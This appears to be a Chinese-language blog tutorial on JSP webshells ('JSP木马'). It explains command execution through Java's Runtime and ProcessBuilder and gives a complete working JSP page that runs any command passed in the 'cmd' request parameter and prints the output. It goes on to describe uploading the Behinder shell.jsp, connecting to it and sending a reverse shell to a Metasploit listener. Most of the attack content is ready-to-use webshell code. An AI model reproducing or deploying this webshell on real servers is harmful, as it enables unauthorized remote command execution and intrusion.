[TOC]



# ==JSP木马原理与利用==

## 一、无回显的方式执行命令

### （1）Runtime的方式

```jsp
Runtime r = Runtime.getRuntime();
r.exec("calc.exe");
// 这两句代码执行可以调用计算器，但是，如果执行的是 ipconfig 那么是没有回显的
```

### （2）ProcessBuilder的方式

```jsp
ProcessBuilder processBuilder = new ProcessBuilder("notepad.exe");
processBuilder.start();
// 这两句代码可以调用记事本，但如果执行的是 ipconfig 那么也没有回显
```

## 二、有回显的方式执行命令

### （1）Runtime方式

```jsp
Runtime r = Runtime.getRuntime();
InputStream is = r.exec("whoami").getInputStream();
InputStreamReader reader = new InputStreamReader(is,"GBK");
BufferedReader bufferedReader = new BufferedReader(reader);
String line = "";
// 按行读取，按行输出
while((line = bufferedReader.readLine()) != null) {
    System.out.println(line);
}
is.close();
reader.close();
bufferedReader.close();

// 上面代码可以执行whoami 这样的代码，并且在命令行中是有回显的
```

![image-20250111183706417](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111183706417.png)

### （2）ProcessBuilder的方式

```jsp
ProcessBuilder processBuilder = new ProcessBuilder("whoami");
InputStream is = processBuilder.start().getInputStream();
InputStreamReader reader = new InputStreamReader(is,"GBK");
BufferedReader bufferedReader = new BufferedReader(reader);
String line = "";
while ((line = bufferedReader.readLine()) != null) {
System.out.println(line);
}
is.close();
reader.close();
bufferedReader.close();

//上面的代码可以执行 whoami 这样的代码，并且在命令行中是有回显的
```

![image-20250111183639109](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111183639109.png)

## 三、有回显执行命令时须注意的问题

Runtime方式可以执行带有空格的命令，但是ProcessBuilder方式不行，ProcessBuilder方式在传参数时，如果带有空格，那么第一个单词会被认为是指令，后面的单词会被认为是参数，差别如下：

### （1）Runtime方式

![image-20250111183555142](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111183555142.png)

### （2）ProcessBuilder方式

![image-20250111183622312](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111183622312.png)

要想解决ProcessBuilder方式这样的问题，我们需要使用多个参数，如下图：

![image-20250111184635351](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111184635351.png)

## 四、编写JSP

```jsp
<%@ page import="java.io.*" %><%--
  Created by IntelliJ IDEA.
  User: hp
  Date: 2025/1/11
  Time: 14:48
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Trojan</title>
</head>
<body>
    <%
        // 读文件
//        String filename = request.getParameter("filename");  // POST请求参数
//        File file = null;
//        InputStreamReader reader = null;
//        InputStream is = null;
//        BufferedReader br = null;
//        try{
//            file = new File(filename);
//            is = new FileInputStream(file);
//            reader = new InputStreamReader(is, "UTF-8");  // 使用 InputStreamReader 并配合编码格式，才能正确以字符的形式来读取文件
//            br = new BufferedReader(reader);
//            String line = ""; //用于接收文本的每一行
//            while ((line = br.readLine()) != null) {
//                response.getWriter().println(line);
//            }
//            is.close();
//            reader.close();
//            br.close();
//        }
//        catch (Exception e){
//            e.printStackTrace();
//        }


        String command = request.getParameter("cmd");
        Runtime r = Runtime.getRuntime();
        InputStream is = r.exec(command).getInputStream();
        InputStreamReader reader = new InputStreamReader(is,"GBK");
        BufferedReader bufferedReader = new BufferedReader(reader);
        String line = "";
        // 按行读取，按行输出
        while((line = bufferedReader.readLine()) != null) {
//            System.out.println(line);
            response.getWriter().println(line+"</br>");
        }
        is.close();
        reader.close();
        bufferedReader.close();

    %>
</body>
</html>
```

我们来看看效果

![image-20250111192721991](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111192721991.png)

## 五、上传冰蝎的shell.jsp

上传之后使用冰蝎来连一下

![image-20250111193620561](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111193620561.png)

连接成功打开，当其显示出环境变量时，说明我们便成功了

![image-20250111193637091](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250111193637091.png)

还可以在反弹shell中，将shell反弹至msf，但是里面还给了一个连接是可以反弹至CobalStrike，但我尝试了之后发现失败了，然后去网上查了一下发现竟然全都是反弹至 msf ，根本没人反弹至 CobalStrike

反弹至 msf 的操作也比较简单

1、填写好对应的 ip 地址 和端口 ，在 msf 中 use exploit/... 监听器 然后 设置 options ，设置好对应的 ip 地址和端口号，要与 冰蝎里面填写的内容一致，直接连就可以了